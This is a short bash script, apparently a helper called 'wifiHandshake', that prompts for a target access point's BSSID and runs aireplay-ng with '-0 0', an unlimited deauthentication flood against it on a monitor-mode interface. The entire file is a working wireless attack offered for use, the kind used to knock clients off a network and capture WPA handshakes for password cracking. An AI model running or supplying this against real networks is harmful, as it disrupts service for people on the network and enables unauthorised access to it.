#!/bin/bash
figlet "wifiHandshake"
echo "aireplay-ng -0 0 $(tput setaf 2)-a $(tput setaf 1)(bssid) $(tput setaf 2)wlan0mon"
echo "Enter bssid"
read bssid
aireplay-ng -0 0 -a $bssid wlan0mon

